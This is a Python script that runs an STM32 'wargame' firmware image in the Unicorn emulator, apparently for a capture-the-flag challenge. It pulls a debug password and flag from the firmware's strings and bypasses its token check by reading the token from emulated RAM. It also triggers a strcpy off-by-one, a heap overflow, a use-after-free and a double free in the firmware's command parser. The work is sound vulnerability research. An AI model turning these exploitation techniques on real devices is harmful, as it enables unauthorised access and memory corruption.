#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import struct
import re
import argparse
from unicorn import Uc, UcError, UC_ARCH_ARM, UC_MODE_THUMB, UC_HOOK_CODE
from unicorn.arm_const import *

# =============================================================================
# STM32F425 memory map
# =============================================================================
FLASH_BASE = 0x08000000
FLASH_SIZE = 0x00200000   

SRAM_BASE  = 0x20000000
SRAM_SIZE  = 0x00020000   

PERIPH_BASE = 0x40000000
PERIPH_SIZE = 0x01000000

CORE_BASE   = 0xE0000000
CORE_SIZE   = 0x00100000

# =============================================================================
# Firmware functions (from Ghidra)
# =============================================================================
PROCESS_TLV  = 0x08000958  # FUN_08000958 (TLV parser)
SEND_MESSAGE = 0x08000738  # FUN_08000738 (print/log)

# TLV codes
CMD_ALLOC       = 0x01
CMD_WRITE       = 0x02
CMD_FREE        = 0x03
CMD_STRCPY      = 0x10
CMD_GEN_TOKEN   = 0x11
CMD_CHECK_TOKEN = 0x13
CMD_DUMP_HEAP   = 0xAA
CMD_DUMP_REGS   = 0xBB
CMD_CRASH       = 0xCC

def tlv(t, payload=b"", length=None):
    if length is None:
        length = len(payload)
    return struct.pack("<B H", t, length) + payload

def read_u32(uc, addr):
    return struct.unpack("<I", uc.mem_read(addr, 4))[0]

def read_u16(uc, addr):
    return struct.unpack("<H", uc.mem_read(addr, 2))[0]

def read_cstr(uc, addr, maxlen=400):
    out = bytearray()
    for i in range(maxlen):
        b = uc.mem_read(addr + i, 1)
        if b == b"\x00":
            break
        out += b
    return bytes(out)

def hexdump(uc, addr, n=64):
    data = bytes(uc.mem_read(addr, n))
    hexs = " ".join(f"{b:02x}" for b in data)
    asci = "".join(chr(b) if 32 <= b < 127 else "." for b in data)
    return f"0x{addr:08x}: {hexs}\n          {asci}"

PRINTABLE_RE = re.compile(rb"[ -~]{4,}")
FLAG_RE = re.compile(r"CTF\{[^}]+\}")

def extract_ascii_runs(blob: bytes, min_len: int = 4):
    out = []
    for m in PRINTABLE_RE.finditer(blob):
        s = m.group(0)
        if len(s) >= min_len:
            out.append(s.decode("ascii", errors="ignore"))
    return out

# =============================================================================
# Unicorn init
# =============================================================================
def build_uc(fw_path: str):
    uc = Uc(UC_ARCH_ARM, UC_MODE_THUMB)

    uc.mem_map(FLASH_BASE, FLASH_SIZE)
    uc.mem_map(SRAM_BASE,  SRAM_SIZE)
    uc.mem_map(PERIPH_BASE, PERIPH_SIZE)
    uc.mem_map(CORE_BASE, CORE_SIZE)

    with open(fw_path, "rb") as f:
        fw = f.read()
    uc.mem_write(FLASH_BASE, fw)

    # stack
    uc.reg_write(UC_ARM_REG_SP, SRAM_BASE + SRAM_SIZE - 0x10)

    # stop pad: infinite branch at EXIT_ADDR
    EXIT_ADDR = SRAM_BASE + SRAM_SIZE - 0x100
    uc.mem_write(EXIT_ADDR, b"\xfe\xe7") 

    return uc, fw, EXIT_ADDR

def install_hooks(uc, EXIT_ADDR):
    messages = []

    def stop_hook(uc, address, size, user_data):
        if (address & ~1) == EXIT_ADDR:
            uc.emu_stop()

    def hook_sendmsg(uc, address, size, user_data):
        if (address & ~1) == SEND_MESSAGE:
            msg_ptr = uc.reg_read(UC_ARM_REG_R0)
            try:
                msg = read_cstr(uc, msg_ptr).decode(errors="replace")
            except Exception:
                msg = f"<unreadable @0x{msg_ptr:08x}>"
            print(msg, end="")
            messages.append(msg)
            lr = uc.reg_read(UC_ARM_REG_LR)
            uc.reg_write(UC_ARM_REG_PC, lr)

    uc.hook_add(UC_HOOK_CODE, stop_hook)
    uc.hook_add(UC_HOOK_CODE, hook_sendmsg)

    return messages




def resolve_globals(uc):
    # From decompiled code: DAT_08000b8c, DAT_08000b68, DAT_08000b6c
    string_buffer = read_u32(uc, 0x08000b8c)
    heap_size_var = read_u32(uc, 0x08000b68)
    heap_ptr_var  = read_u32(uc, 0x08000b6c)

    # Token vars (from decompiled: *DAT_08000b9c = token, *DAT_08000ba0 = ready_flag)
    # If these addresses don't exist in your binary, this will still read something,
    # but you can comment them out if needed.
    token_value_var = read_u32(uc, 0x08000b9c)
    token_ready_var = read_u32(uc, 0x08000ba0)

    return string_buffer, heap_size_var, heap_ptr_var, token_value_var, token_ready_var




def run_one(uc, EXIT_ADDR, BUF_ADDR, cmd, payload=b"", length=None, count=200000):
    pkt = tlv(cmd, payload, length=length)
    uc.mem_write(BUF_ADDR, pkt)
    uc.reg_write(UC_ARM_REG_R0, BUF_ADDR)
    uc.reg_write(UC_ARM_REG_R1, len(pkt))
    uc.reg_write(UC_ARM_REG_LR, EXIT_ADDR | 1)

    try:
        uc.emu_start(PROCESS_TLV | 1, EXIT_ADDR + 2, count=count)
        return True, None, None
    except UcError as e:
        pc = uc.reg_read(UC_ARM_REG_PC)
        return False, e, pc


def extract_secrets_from_firmware(fw: bytes):
    strings = extract_ascii_runs(fw, min_len=4)

    pwd = None
    for s in strings:
        if "DEBUG" in s and any(ch.isdigit() for ch in s):
            pwd = s
            break

    flag = None
    for s in strings:
        m = FLAG_RE.search(s)
        if m:
            flag = m.group(0)
            break

    return pwd, flag

def token_auth_automated(uc, EXIT_ADDR, BUF_ADDR, token_value_var, token_ready_var):
    print("\n[*] TLV 0x11 generate token")
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_GEN_TOKEN, b"")
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")
        return

    try:
        ready = uc.mem_read(token_ready_var, 1)[0]
    except Exception:
        ready = None

    try:
        token = read_u32(uc, token_value_var)
    except Exception:
        token = None

    print(f"[+] token_ready @0x{token_ready_var:08x} = {ready}")
    print(f"[+] token_value @0x{token_value_var:08x} = 0x{(token if token is not None else 0):08x}")

    if token is None:
        print("[!] Impossible de lire le token en RAM (adresse token_value_var incorrecte).")
        return

    print("\n[*] TLV 0x13 check token (auto)")
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_CHECK_TOKEN, struct.pack("<I", token))
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")

def dump_debug_info(uc, EXIT_ADDR, BUF_ADDR):
    print("\n[*] Debug dumps")
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_DUMP_HEAP, b"")
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_DUMP_REGS, b"")
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")

# =============================================================================
# Step 3: vulnerability proofs (with canaries + hexdumps)
# =============================================================================
def test_strcpy_baseline(uc, EXIT_ADDR, BUF_ADDR, string_buffer):
    print("\n[*] TLV 0x10 STRCPY baseline (AAAA\\x00)")
    uc.mem_write(string_buffer, b"\x00" * 0x40)
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_STRCPY, b"AAAA\x00")
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")
    print(hexdump(uc, string_buffer, 0x40))

def test_strcpy_off_by_one(uc, EXIT_ADDR, BUF_ADDR, string_buffer):
    print("\n[*] TLV 0x10 STRCPY OFF-BY-ONE proof (33 bytes, NO NUL)")
    uc.mem_write(string_buffer, b"\x00" * 0x40)

    canary_addr = string_buffer + 0x20
    uc.mem_write(canary_addr, b"\xCC")
    before = uc.mem_read(canary_addr, 1)[0]
    print(f"    Canary before: {before:02x} @ 0x{canary_addr:08x}")

    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_STRCPY, b"A" * 33)
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")

    after = uc.mem_read(canary_addr, 1)[0]
    print(f"    Canary after : {after:02x} @ 0x{canary_addr:08x}")
    print(hexdump(uc, string_buffer, 0x40))

def test_heap_overflow_with_proof(uc, EXIT_ADDR, BUF_ADDR, heap_size_var, heap_ptr_var):
    print("\n[*] TLV 0x01 alloc size=0x20 (length field drives alloc)")
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_ALLOC, payload=b"", length=0x20)
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")
        return

    alloc_size = read_u16(uc, heap_size_var)
    alloc_ptr  = read_u32(uc, heap_ptr_var)
    print(f"    heap_size = {alloc_size} (0x{alloc_size:x})")
    print(f"    heap_ptr  = 0x{alloc_ptr:08x}")

    # Canary at heap_ptr + heap_size + hexdump BEFORE
    heap_canary_addr = alloc_ptr + alloc_size
    uc.mem_write(heap_canary_addr, b"\xCC")
    before = uc.mem_read(heap_canary_addr, 1)[0]
    print(f"    Heap canary before: {before:02x} @ 0x{heap_canary_addr:08x}")
    print("[*] Heap dump BEFORE overflow (0x80 bytes from heap_ptr):")
    print(hexdump(uc, alloc_ptr, 0x80))

    print("\n[*] TLV 0x02 heap overflow: copy 200 bytes into alloc(0x20)")
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_WRITE, b"B" * 200)
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")

    after = uc.mem_read(heap_canary_addr, 1)[0]
    print(f"    Heap canary after : {after:02x} @ 0x{heap_canary_addr:08x}")
    print("[*] Heap dump AFTER overflow (0x80 bytes from heap_ptr):")
    print(hexdump(uc, alloc_ptr, 0x80))

    print("\n[*] TLV 0x03 free")
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_FREE, b"")
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")

def test_uaf_candidate_with_dump(uc, EXIT_ADDR, BUF_ADDR, heap_size_var, heap_ptr_var):
    print("\n[*] UAF candidate: 0x01 alloc -> 0x03 free -> 0x02 write")
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_ALLOC, payload=b"", length=0x20)
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")
        return

    uaf_size = read_u16(uc, heap_size_var)
    uaf_ptr  = read_u32(uc, heap_ptr_var)
    print(f"    heap_size = {uaf_size} (0x{uaf_size:x})")
    print(f"    heap_ptr  = 0x{uaf_ptr:08x}")

    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_FREE, b"")
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")
        return

    # Mark freed chunk memory and show BEFORE
    uc.mem_write(uaf_ptr, b"\xCC" * 0x40)
    print("[*] Freed chunk dump BEFORE UAF write (0x40 bytes):")
    print(hexdump(uc, uaf_ptr, 0x40))

    # Try writing after free
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_WRITE, b"D" * 0x30)
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")

    print("[*] Freed chunk dump AFTER UAF write (0x40 bytes):")
    print(hexdump(uc, uaf_ptr, 0x40))

def test_double_free_candidate(uc, EXIT_ADDR, BUF_ADDR):
    print("\n[*] Double free candidate: 0x01 alloc -> 0x03 free -> 0x03 free")
    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_ALLOC, payload=b"", length=0x20)
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")
        return

    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_FREE, b"")
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")
        return

    ok, err, pc = run_one(uc, EXIT_ADDR, BUF_ADDR, CMD_FREE, b"")
    if not ok:
        print(f"\n[!] Unicorn error: {err} @ PC=0x{pc:08X}")

# =============================================================================
# Main
# =============================================================================
def main():
    ap = argparse.ArgumentParser(description="Integrated Step 3 + Step 4 Unicorn tool")
    ap.add_argument("--fw", default="wargame.bin", help="firmware path")
    ap.add_argument("--mode",
                    choices=["all", "extract", "auth", "debug", "strcpy", "heap", "uaf", "dfree"],
                    default="all")
    args = ap.parse_args()

    uc, fw, EXIT_ADDR = build_uc(args.fw)
    install_hooks(uc, EXIT_ADDR)

    BUF_ADDR = SRAM_BASE + 0x500

    string_buffer, heap_size_var, heap_ptr_var, token_value_var, token_ready_var = resolve_globals(uc)
    print("[*] Resolved addresses from firmware:")
    print(f"    STRING_BUFFER   = 0x{string_buffer:08x}")
    print(f"    HEAP_SIZE_VAR   = 0x{heap_size_var:08x}")
    print(f"    HEAP_PTR_VAR    = 0x{heap_ptr_var:08x}")
    print(f"    TOKEN_VALUE_VAR = 0x{token_value_var:08x}")
    print(f"    TOKEN_READY_VAR = 0x{token_ready_var:08x}")

    if args.mode in ("all", "extract"):
        print("\n[*] Static extraction (strings) from firmware bytes")
        pwd, flag = extract_secrets_from_firmware(fw)
        print(f"[+] Candidate debug password (strings): {pwd}")
        print(f"[+] Candidate flag (strings): {flag}")

    if args.mode in ("all", "auth"):
        print("\n[*] Automated token authentication (0x11 -> read RAM -> 0x13)")
        token_auth_automated(uc, EXIT_ADDR, BUF_ADDR, token_value_var, token_ready_var)

    if args.mode in ("all", "debug"):
        dump_debug_info(uc, EXIT_ADDR, BUF_ADDR)

    if args.mode in ("all", "strcpy"):
        test_strcpy_baseline(uc, EXIT_ADDR, BUF_ADDR, string_buffer)
        test_strcpy_off_by_one(uc, EXIT_ADDR, BUF_ADDR, string_buffer)

    if args.mode in ("all", "heap"):
        test_heap_overflow_with_proof(uc, EXIT_ADDR, BUF_ADDR, heap_size_var, heap_ptr_var)

    if args.mode in ("all", "uaf"):
        test_uaf_candidate_with_dump(uc, EXIT_ADDR, BUF_ADDR, heap_size_var, heap_ptr_var)

    if args.mode in ("all", "dfree"):
        test_double_free_candidate(uc, EXIT_ADDR, BUF_ADDR)

if __name__ == "__main__":
    main()
